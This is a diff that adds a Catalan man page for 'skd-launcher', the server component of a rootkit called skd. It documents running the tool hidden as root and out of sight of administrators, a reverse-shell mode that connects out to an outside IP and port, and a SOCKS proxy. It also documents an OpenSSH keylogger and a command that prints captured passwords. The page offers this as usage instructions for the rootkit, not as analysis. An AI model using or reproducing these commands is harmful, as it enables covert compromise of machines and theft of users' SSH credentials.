@@ -1,0 +1,123 @@
+.TH SKD-LAUNCHER 1
+
+.SH NOM
+
+skd-launcher - part launcher del rootkit skd
+
+.SH SINOPSIS
+
+.B skd-launcher
+.PP
+.B skd-launcher
+.I port
+.PP
+.B skd-launcher 
+.I host port
+.PP
+.B skd-launcher -c
+.I command option
+
+.SH OPCIONS
+
+El skd-launcher pot ser executat de diferents maneres depenent del nombre de paràmetres que se li passin per línia de comandes.
+.PP
+En tots aquests modes d'execució, en cas de què un paràmetre sigui passat incorrectament, el launcher surt sense emetre cap missatge.
+
+
+.B Execució sense paràmetres
+.PP
+.TP
+Si s'executa sense paràmetres, aquest ha de ser executat com a root. Al executar-se, aquest queda en funcionament com a servei de sistema.
+.PP
+
+.B Execució amb un paràmetre
+.PP
+Si s'executa passant-li per paràmetre un enter, aquest obre el port TCP i queda en execució com a servei a la màquina.
+.PP
+.IR port :
+Port TCP on el launcher intentarà arrancar el seu servei.
+.PP
+
+.B Execució amb dos paràmetres
+.PP
+Si s'executa passant-li dos paràmetres, el launcher s'intenta connectar al host i port on host és un string passat com a primer paràmetre, i el port, un enter passat en el segon paràmetre.
+.PP
+.IR host :
+Host destí on s'intentarà connectar per a trobar-hi un client i oferir-li una shell.
+.PP
+.IR port :
+Port destí del host.
+.PP
+
+.B Execució amb tres paràmetres
+.PP
+En l'últim mode d'execució, el launcher s'executa utilitzant l'opció -c i dos paràmetres. El primer és la comanda a executar, i el segon un paràmetre utilitzat per la comanda.
+.PP
+.B -c
+{
+.I drc4 file
+|
+.I rc4 file
+|
+.I socks port
+| keys service
+}
+.PP
+.I drc4 file
+: desxifra el fitxer file utilitzant les claus de xifratge rc4 configurades. 
+.PP
+.I rc4 file
+: xifra el ftxer file utilitzant les claus de xifratge rc4 configurades. 
+.PP
+.I socks port
+: engega un servei socks4a en el port tcp especificat.
+.PP
+.I keys service
+: engega el keylogger en el servei especificat. En aquest moment només està implementat el servei ssh que fa referència a serveis openssh 2.x.
+.PP
+.SH DISPONIBILITAT
+
+Totes les variants de UNIX que compleixin l'estàndard POSIX.
+
+.SH DESCRIPCIÓ
+
+skd-launcher és la part servidor del rootkit skd. Aquesta part, és la què implementa totes les funcionalitats principals. Per tal d'utilitzar-les ens cal disposar de la part client i del password amb què va estar configurat. Sempre ens interessarà que el skd-launcher sigui executat amb el màxim de privilegis possibles, i que aquest no sigui descobert per els administradors de la màquina.
+.PP
+
+.SH EXEMPLES
+.B skd-launcher
+.PP
+Aquesta execució sense paràmetres, ens deixaria el servei corrent a la màquina del mode més ocult possible.
+
+.B skd-launcher 9999
+.PP
+Executant-lo d'aquesta manera, tindríem un servei TCP escoltant al port 9999.
+
+.B skd-launcher 80.58.0.33 8888
+.PP
+D'aquesta manera aconseguirem que el launcher es connecti al host 80.58.0.33 port 8888 per tal d'oferir-li una shell. D'aquesta manera no queda cap servei en execució.
+
+.B skd-launcher -c drc4 .k_rc4_sshd
+.PP
+Llançant el launcher així, ens mostraria per pantalla tots els passwords obtinguts a la màquina i guardats de forma xifrada en el fitxer .k_rc4_sshd.
+
+.B skd-launcher -c rc4 /etc/fstab > fstab.rc4
+.PP
+Amb aquesta execució, xifraríem el fitxer /etc/fstab i el guardaríem en el fitxer fstab.rc4.
+
+.B skd-launcher -c socks 9999
+.PP
+Amb això iniciem el servei socks al port tcp 9999.
+
+.B skd-launcher -c keys sshd
+.PP
+Llançant el launcher així, arranquem el keylogger del servei openssh.
+
+.SH AUTOR
+
+Albert Sellarès <whats[@t]wekk.net>
+
+.SH VEURE TAMBÉ
+.RS
+skd-client(1), skd-config(7).
+.RE
